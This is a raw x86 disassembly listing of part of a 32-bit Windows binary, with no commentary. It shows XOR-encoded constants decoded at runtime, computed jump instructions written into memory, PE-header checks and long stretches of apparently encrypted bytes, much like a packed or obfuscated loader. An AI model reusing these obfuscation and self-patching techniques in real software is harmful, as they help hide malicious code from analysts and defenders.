  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x430556,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42ee30,0x430552
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ee10,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x4304a2,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x43054e,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x4304b2,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x4304b6,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0x7fd592ce,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a1ee
  40a236:	push   cs
  40a237:	pushf  
  40a238:	ss jmp 0x3e86:0x24841c98
  40a240:	mov    ds:0x8fdbe8fe,al
  40a245:	sahf   
  40a246:	mov    eax,ds:0xaee52fa7
  40a24b:	cmovle edi,DWORD PTR [esi]
  40a24e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a24f:	outs   dx,DWORD PTR ds:[esi]
  40a250:	or     ch,BYTE PTR [ecx+0x47e03057]
  40a256:	test   BYTE PTR [eax+0x4f5a91c7],dl
  40a25c:	icebp  
  40a25d:	add    al,0x7d
  40a25f:	or     al,cl
  40a261:	xchg   ebp,eax
  40a262:	push   eax
  40a264:	add    al,0xba
  40a266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a267:	add    DWORD PTR [ebp+ebx*4-0x15ab8276],edx
  40a26e:	test   eax,0x7ccf2050
  40a273:	xchg   edi,eax
  40a274:	(bad)  
  40a275:	popa   
  40a276:	inc    esp
  40a277:	inc    ecx
  40a278:	imul   edx,DWORD PTR [ecx-0x2b],0xffffffea
  40a27c:	ins    BYTE PTR es:[edi],dx
  40a27d:	ret    
  40a27e:	out    0xd1,eax
  40a280:	and    DWORD PTR [ebx+eax*8+0x4e2235fb],0x63
  40a288:	in     al,dx
  40a289:	aam    0xae
  40a28b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a28c:	lds    edx,FWORD PTR [edi+ebx*1]
  40a28f:	(bad)  [edx-0x1]
  40a292:	repz mov cs:0xece88f66,eax
  40a299:	sub    DWORD PTR [ecx-0x30b969cc],eax
  40a29f:	retf   0xf5b5
  40a2a2:	xchg   ecx,eax
  40a2a3:	dec    eax
  40a2a4:	inc    esi
  40a2a5:	mov    al,ds:0xedc05c6a
  40a2aa:	jno    0x40a313
  40a2ac:	loopne 0x40a28d
  40a2ae:	xchg   esi,eax
  40a2af:	(bad)  
  40a2b1:	loope  0x40a253
  40a2b3:	push   ss
  40a2b4:	fimul  WORD PTR [ebx+0x34efbe2d]
  40a2ba:	lods   eax,DWORD PTR ds:[esi]
  40a2bb:	repz jno 0x40a2f8
  40a2be:	(bad)  
  40a2c0:	xor    dh,BYTE PTR [esi-0x4f5f1227]
  40a2c6:	sahf   
  40a2c7:	mov    eax,es:0x2bc69983
  40a2cd:	xor    ah,al
  40a2cf:	fs cli 
  40a2d1:	jp     0x40a279
  40a2d3:	push   esi
  40a2d4:	fbstp  TBYTE PTR [ebx+0x15ce51d3]
  40a2da:	repz mov dh,0x7d
  40a2dd:	dec    esi
  40a2de:	mov    cl,0xe0
  40a2e0:	push   edi
  40a2e1:	int    0x9f
  40a2e3:	mov    ah,0x55
  40a2e5:	mov    ?,WORD PTR ds:0xa7feda44
  40a2eb:	popf   
  40a2ec:	fiadd  WORD PTR [ebx-0xc941a01]
  40a2f2:	adc    ch,BYTE PTR [esi]
  40a2f4:	jne    0x40a2bd
  40a2f6:	sbb    DWORD PTR [ebx+0xdd339d2],eax
  40a2fc:	mov    edi,0x1b5e90a
  40a301:	sahf   
  40a302:	scas   al,BYTE PTR es:[edi]
  40a303:	and    DWORD PTR [ecx+ebx*1+0xb29e9fa],esp
  40a30a:	outs   dx,BYTE PTR ds:[esi]
  40a30b:	or     DWORD PTR [ecx],ecx
  40a30d:	dec    esi
  40a30e:	mov    edi,0xf29abd75
  40a313:	out    dx,eax
  40a314:	adc    eax,DWORD PTR cs:[edi+0x11b432cd]
  40a31b:	imul   eax,DWORD PTR [esi],0x37
  40a31e:	stc    
  40a31f:	scas   eax,DWORD PTR es:[edi]
  40a320:	pushf  
  40a321:	call   0xe913dabc
  40a326:	repz xor dh,dl
  40a329:	jae    0x40a2d3
  40a32b:	pop    esp
  40a32c:	add    esi,DWORD PTR [edi-0x63a2c06c]
  40a332:	fidiv  WORD PTR [esi]
  40a334:	xchg   esi,edx
  40a336:	add    esi,DWORD PTR [eax+0x51251920]
  40a33c:	push   0x6a
  40a33e:	inc    edi
  40a33f:	and    DWORD PTR [edi-0x48],0x86c43510
  40a346:	pop    ecx
  40a347:	xchg   DWORD PTR [eax-0x3103ef75],ecx
  40a34d:	add    al,0xcc
  40a34f:	fcomp  QWORD PTR [eax-0x67]
  40a352:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a353:	mov    edi,0xf30a2762
  40a358:	aaa    
  40a359:	xchg   ebp,eax
  40a35a:	push   ss
  40a35b:	adc    ecx,ecx
  40a35d:	sbb    ah,BYTE PTR [ebx+0x5f]
  40a360:	sbb    cl,BYTE PTR ds:0x1c0b68b8
  40a366:	popa   
  40a367:	ins    BYTE PTR es:[edi],dx
  40a368:	push   ds
  40a369:	ror    BYTE PTR [ebx],0xfb
  40a36c:	neg    BYTE PTR [eax-0x7]
  40a36f:	dec    esp
  40a370:	push   edi
  40a372:	jl     0x40a37d
  40a374:	shl    BYTE PTR [edx+0x7616ffb6],0xf2
  40a37b:	pop    eax
  40a37c:	ins    BYTE PTR es:[edi],dx
  40a37d:	xchg   edx,eax
  40a37e:	xor    bl,BYTE PTR [edx-0x50]
  40a381:	or     DWORD PTR [eax+edx*4-0x17],edi
  40a385:	add    al,0x82
  40a387:	aam    0x4a
  40a389:	push   ecx
  40a38a:	fnsave [ebp+0x5e]
  40a38d:	jns    0x40a3cf
  40a38f:	out    0x3b,eax
  40a391:	scas   al,BYTE PTR es:[edi]
  40a392:	jo     0x40a372
  40a394:	pop    edi
  40a395:	or     al,0x83
  40a397:	nop
  40a398:	or     bl,0xd0
  40a39b:	and    DWORD PTR [esi+0x69],0xfffffff9
  40a39f:	jmp    0x40a3ab
  40a3a1:	or     al,0xb9
  40a3a3:	jecxz  0x40a3b3
  40a3a5:	es mov ah,0xe6
  40a3a8:	retf   0xa1ed
  40a3ab:	lods   eax,DWORD PTR ds:[esi]
  40a3ac:	clts   
  40a3ae:	push   edi
  40a3af:	inc    ebx
  40a3b0:	retf   
  40a3b1:	in     eax,dx
  40a3b2:	cmc    
  40a3b3:	xlat   BYTE PTR ds:[ebx]
  40a3b4:	push   ss
  40a3b5:	and    cl,BYTE PTR [eax]
  40a3b7:	sub    eax,DWORD PTR ds:0xfa3b48b2
  40a3bd:	call   FWORD PTR [ebx]
  40a3bf:	iret   
  40a3c0:	xor    dh,BYTE PTR [ecx-0x49]
  40a3c3:	aas    
  40a3c4:	jno    0x40a437
  40a3c6:	push   0xd390f5e
  40a3cb:	and    al,BYTE PTR [esi+0x32cc08dc]
  40a3d1:	cdq    
  40a3d2:	sub    DWORD PTR [eax],eax
  40a3d4:	mov    ebx,0x8bad979d
  40a3d9:	jl     0x40a3cf
  40a3db:	cmp    eax,0x1f8bdf2e
  40a3e0:	and    edx,DWORD PTR [ebx+0x2422b59e]
  40a3e6:	lahf   
  40a3e7:	pushf  
  40a3e8:	popa   
  40a3e9:	xor    DWORD PTR [edx],esp
  40a3eb:	ins    BYTE PTR es:[edi],dx
  40a3ec:	dec    edi
  40a3ed:	ror    DWORD PTR [edx+0x66270fb5],1
  40a3f3:	or     eax,0x6381b115
  40a3f8:	pop    ds
  40a3f9:	repnz into 
  40a3fb:	mov    bl,0x17
  40a3fd:	mov    edi,0x4b635852
  40a402:	xlat   BYTE PTR ds:[ebx]
  40a403:	pop    ebp
  40a404:	sbb    eax,DWORD PTR [edx-0x63]
  40a407:	mov    eax,0x6d8e1a72
  40a40c:	pop    esi
  40a40d:	xchg   al,bl
  40a40f:	lahf   
  40a410:	inc    edi
  40a411:	ds aas 
  40a413:	aaa    
  40a414:	adc    al,0xe0
  40a416:	clc    
  40a417:	pop    eax
  40a418:	mov    edi,0xe14853a1
  40a41d:	iret   
  40a41e:	cmp    dh,cl
  40a420:	loope  0x40a445
  40a422:	bound  esp,QWORD PTR [edx+eax*2+0x4c]
  40a426:	jbe    0x40a413
  40a428:	popf   
  40a429:	into   
  40a42a:	mov    esp,0xf3d4a61f
  40a42f:	(bad)  
  40a431:	stos   DWORD PTR es:[edi],eax
  40a432:	push   0xffffffbb
  40a434:	push   0x72dc3c02
  40a439:	sbb    al,0x22
  40a43b:	test   DWORD PTR [eax-0x6b0f1089],edx
  40a441:	jecxz  0x40a479
  40a443:	shl    BYTE PTR es:[ecx-0x51],0x99
  40a448:	mov    esp,0xaa0f6c1f
  40a44d:	test   al,0x96
  40a44f:	cli    
  40a450:	xor    BYTE PTR [esi-0x51],dh
  40a453:	add    eax,0x4d0025a
  40a458:	mov    ds:0x414a31f6,al
  40a45d:	addr16 push 0x4c
  40a460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a461:	test   BYTE PTR [eax+ecx*2-0x774490ed],0x82
  40a469:	jb     0x40a47b
  40a46b:	das    
  40a46c:	cmp    dl,BYTE PTR [ebx]
  40a46e:	cmp    DWORD PTR [ebp+edi*4-0x2797174b],ecx
  40a475:	jnp    0x40a493
  40a477:	mov    esp,0x10f04e9a
  40a47c:	push   es
  40a47d:	std    
  40a47e:	cmp    bh,bl
  40a480:	std    
  40a481:	stos   BYTE PTR es:[edi],al
  40a482:	imul   eax,ebp,0x39da6cf7
  40a488:	push   ds
  40a489:	lods   eax,DWORD PTR ds:[esi]
  40a48a:	leave  
  40a48b:	jmp    0x838f:0xea375908
  40a492:	das    
  40a493:	inc    eax
  40a494:	test   al,0x9d
  40a496:	mov    eax,DWORD PTR [ebp+0x8]
  40a499:	mov    DWORD PTR ds:0x430542,0x17
  40a4a3:	cmp    DWORD PTR ds:0x430542,0x0
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x430542,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42eae4
  40a4c6:	mov    ecx,DWORD PTR ds:0x430542
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x430542,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0x68fba360
  40a537:	shl    ah,1
  40a539:	mov    ah,0xe8
  40a53b:	jle    0x40a5bb
  40a53d:	fbstp  TBYTE PTR [eax+0x7e]
  40a540:	jle    0x40a599
  40a542:	shl    DWORD PTR [edi],1
  40a544:	lea    eax,[ebp+0x18738c38]
  40a54a:	or     cl,BYTE PTR [ebp-0x75]
  40a54d:	fs pushf 
  40a54f:	sub    DWORD PTR [ebx+0x73de8e3c],esp
  40a555:	lea    esi,[edx-0x30]
  40a558:	pop    esp
  40a559:	mov    ch,0x66
  40a55b:	popa   
  40a55c:	xchg   esi,eax
  40a55d:	stc    
  40a55e:	or     bh,BYTE PTR [esi+0x3c5b396b]
  40a564:	pop    ss
  40a565:	mov    dh,0x20
  40a567:	or     dl,dl
  40a569:	dec    ecx
  40a56a:	adc    DWORD PTR [eax+0x1efb6aba],edi
  40a570:	or     esi,edi
  40a572:	xor    BYTE PTR [ebx],dh
  40a574:	aam    0xe9
  40a576:	arpl   WORD PTR [eax+0x6c8f47a1],bp
  40a57c:	xor    DWORD PTR [ecx-0x1d],edi
  40a57f:	and    ebx,0xc297cde7
  40a585:	aaa    
  40a586:	and    edi,edx
  40a588:	test   eax,0x73a010c
  40a58d:	mov    al,ds:0xe2b12597
  40a592:	lods   al,BYTE PTR ds:[esi]
  40a593:	inc    edi
  40a594:	pop    ss
  40a595:	xchg   ebx,eax
  40a596:	aas    
  40a597:	xchg   esi,ebp
  40a599:	shr    BYTE PTR ds:0x5838fa9d,0x6b
  40a5a0:	add    esi,DWORD PTR [edx+0x5d]
  40a5a3:	loop   0x40a5c7
  40a5a5:	gs cwde 
  40a5a7:	into   
  40a5a8:	popf   
  40a5a9:	mov    dl,0xe8
  40a5ab:	rcr    DWORD PTR [ecx+0x0],1
  40a5ae:	enter  0x6812,0x1b
  40a5b2:	jbe    0x40a5e1
  40a5b4:	dec    esi
  40a5b5:	cmp    eax,0x1b1804cd
  40a5ba:	out    0xfc,eax
  40a5bc:	jmp    FWORD PTR [edx-0x7b]
  40a5bf:	scas   eax,DWORD PTR es:[edi]
  40a5c0:	ins    BYTE PTR es:[edi],dx
  40a5c1:	pop    edx
  40a5c2:	ins    BYTE PTR es:[edi],dx
  40a5c3:	sub    DWORD PTR [ebx+0x2f],edx
  40a5c6:	retf   0x207f
  40a5c9:	sar    BYTE PTR [ecx+eiz*2],0x5a
  40a5cd:	leave  
  40a5ce:	adc    BYTE PTR [edx+0xfeb5da],ah
  40a5d4:	xchg   esp,eax
  40a5d5:	rcl    edi,0x58
  40a5d8:	sub    DWORD PTR [edx-0x226cf28a],ecx
  40a5de:	jb     0x40a562
  40a5e0:	(bad)  [eax+ebp*4]
  40a5e3:	clc    
  40a5e4:	pop    ecx
  40a5e5:	add    BYTE PTR [edi],0x95
  40a5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5e9:	push   edi
  40a5ea:	add    al,BYTE PTR [ecx+0x1996be02]
  40a5f0:	shl    al,0x9a
  40a5f3:	cmp    edx,DWORD PTR [eax]
  40a5f5:	pop    ebp
  40a5f6:	shl    DWORD PTR [ebx],cl
  40a5f8:	mov    ds:0x90e8b81,eax
  40a5fd:	test   BYTE PTR [ebp+0x40616d5f],cl
  40a603:	and    BYTE PTR [ecx-0x2b01a832],cl
  40a609:	or     al,0x92
  40a60b:	mov    ecx,0xa9e1948e
  40a610:	adc    al,0x1c
  40a612:	push   esp
  40a613:	scas   eax,DWORD PTR es:[edi]
  40a614:	div    BYTE PTR [esi-0x7d]
  40a617:	mov    DWORD PTR [esi+0x41],esp
  40a61a:	repnz push ds
  40a61c:	jge    0x40a694
  40a61e:	or     BYTE PTR [ecx-0x2f05e0c9],dl
  40a624:	aas    
  40a625:	jge    0x40a5db
  40a627:	ret    0xe362
  40a62a:	pop    edi
  40a62b:	sub    eax,DWORD PTR [ebp-0x1b]
  40a62e:	ret    0xed2e
  40a631:	imul   edi,DWORD PTR [ecx],0x13
  40a634:	sub    al,BYTE PTR [eax]
  40a636:	in     eax,dx
  40a637:	mov    edx,0x998c75e0
  40a63c:	clc    
  40a63d:	leave  
  40a63e:	mov    ah,0xce
  40a640:	bound  edi,QWORD PTR [ecx+0x13e0522d]
  40a646:	and    esp,esp
  40a648:	jl     0x40a68d
  40a64a:	cs iret 
  40a64c:	or     al,BYTE PTR [ebx-0x42]
  40a64f:	add    DWORD PTR [ecx+0x39],0xa64800c9
  40a656:	pop    ebp
  40a657:	add    eax,0x1718e07e
  40a65c:	mov    edx,DWORD PTR [esi]
  40a65e:	out    dx,al
  40a65f:	mov    BYTE PTR [ebp+0x55],ah
  40a662:	fidiv  WORD PTR [eax+edi*4]
  40a665:	shl    DWORD PTR ds:0xc26aaa7,0x97
  40a66c:	or     eax,edi
  40a66e:	push   ecx
  40a66f:	ja     0x40a66a
  40a671:	jmp    0x40a64a
  40a673:	test   eax,0xaaa3c91b
  40a678:	mov    ds:0xc3b5b03d,al
  40a67d:	and    ecx,edx
  40a67f:	xchg   ebp,eax
  40a680:	push   ecx
  40a681:	jmp    FWORD PTR [eax+edi*4+0x1e]
  40a685:	imul   ebp,DWORD PTR [edi-0x25],0x946bde22
  40a68c:	push   eax
  40a68d:	xlat   BYTE PTR ds:[ebx]
  40a68e:	mov    esi,0x39211e0b
  40a693:	(bad)  
  40a695:	add    eax,0x2daac092
  40a69a:	in     eax,dx
  40a69b:	mov    bl,BYTE PTR [edx]
  40a69d:	cli    
  40a69e:	mov    ebp,0x5a87cf68
  40a6a3:	loop   0x40a6c8
  40a6a5:	out    0xc9,eax
  40a6a7:	adc    eax,0x24ed27db
  40a6ac:	pop    ebx
  40a6ad:	mov    al,ds:0xf4f26e20
  40a6b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6b3:	mov    ah,0x2f
  40a6b5:	repnz dec ebp
  40a6b7:	push   esi
  40a6b8:	stos   DWORD PTR es:[edi],eax
  40a6b9:	test   eax,0x49c53bf5
  40a6be:	jge    0x40a70e
  40a6c0:	js     0x40a6bc
  40a6c2:	div    DWORD PTR [edx-0x24]
  40a6c5:	mov    esi,0x1fa32637
  40a6ca:	stc    
  40a6cb:	sub    ch,BYTE PTR [esi+0x7c]
  40a6ce:	lock inc ebx
  40a6d0:	sbb    eax,0x26e9a698
  40a6d5:	and    DWORD PTR [edx-0x42],esp
  40a6d8:	loopne 0x40a661
  40a6da:	sub    bl,cl
  40a6dc:	adc    al,0xe8
  40a6de:	mov    ebp,DWORD PTR [esi+0x28]
  40a6e1:	pop    esp
  40a6e2:	pop    ecx
  40a6e3:	xlat   BYTE PTR ds:[ebx]
  40a6e4:	rol    BYTE PTR [edi],0x73
  40a6e7:	mov    DWORD PTR [esi-0xc],edx
  40a6ea:	sbb    BYTE PTR [ebx],cl
  40a6ec:	test   al,0x4c
  40a6ee:	lahf   
  40a6ef:	dec    edi
  40a6f0:	or     al,0x28
  40a6f2:	loopne 0x40a75b
  40a6f4:	leave  
  40a6f5:	arpl   WORD PTR [esi],sp
  40a6f7:	xchg   edx,eax
  40a6f8:	cli    
  40a6f9:	sbb    ebx,ebx
  40a6fb:	or     DWORD PTR [ebp+0x4],edi
  40a6fe:	jmp    0x6006:0x15873c62
  40a705:	shr    DWORD PTR [ecx],0xd1
  40a708:	or     DWORD PTR [ebx+0x1c],esi
  40a70b:	imul   edx,DWORD PTR [esi+0x1e],0xeb5dba
  40a712:	fnsave [edx+0x13]
  40a715:	mov    ch,0x4b
  40a717:	jmp    0xcb0f81a1
  40a71c:	mov    ecx,0x67778904
  40a721:	push   esi
  40a722:	jne    0x40a6da
  40a724:	lds    ebp,FWORD PTR ds:0x432360b4
  40a72a:	aad    0x5d
  40a72c:	push   ebx
  40a72d:	mov    ecx,0x9ca33249
  40a732:	test   eax,0xdc4370be
  40a737:	outs   dx,BYTE PTR ds:[esi]
  40a738:	xchg   edi,eax
  40a739:	inc    eax
  40a73a:	mov    edi,0x3bb500c7
  40a73f:	rol    DWORD PTR [esi-0x4ce4acfc],1
  40a745:	xchg   ebx,eax
  40a746:	mov    ss,WORD PTR [edx]
  40a748:	push   ebx
  40a749:	xchg   esp,eax
  40a74a:	retf   
  40a74b:	adc    eax,0x9c979626
  40a750:	dec    ebp
  40a751:	mov    ebp,0x6fe28978
  40a756:	outs   dx,DWORD PTR ds:[esi]
  40a757:	lds    ecx,FWORD PTR [edi]
  40a759:	xor    al,0xa4
  40a75b:	xchg   edx,eax
  40a75c:	push   ebp
  40a75d:	mov    edi,0x61ada14
  40a762:	(bad)  
  40a763:	xchg   esi,eax
  40a764:	xchg   edx,eax
  40a765:	or     DWORD PTR [ecx+0x7cd1ba9e],0xffffffb4
  40a76c:	cli    
  40a76d:	add    DWORD PTR [edi-0x37],esi
  40a770:	sti    
  40a771:	pop    ds
  40a772:	mov    bl,0x71
  40a774:	or     dl,BYTE PTR [edx+0x49a3b2ce]
  40a77a:	inc    esp
  40a77b:	pushf  
  40a77c:	jl     0x40a7db
  40a77e:	retf   
  40a77f:	ret    
  40a780:	dec    DWORD PTR [ebp-0x1b90996d]
  40a786:	ja     0x40a7e6
  40a788:	popa   
  40a789:	or     eax,edi
  40a78b:	fwait
  40a78c:	adc    ebp,ebx
  40a78e:	sbb    al,0x36
  40a790:	mov    ah,0xec
  40a792:	sbb    bh,BYTE PTR [edx+0x54267776]
  40a798:	xor    al,0x57
  40a79a:	fidivr WORD PTR [ebp-0x9]
  40a79d:	xchg   esi,eax
  40a79e:	or     ecx,DWORD PTR [ebx+ecx*1]
  40a7a1:	push   0x32729d05
  40a7a6:	add    cl,cl
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43049e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43049e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43049e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43049e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43049e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ebd0
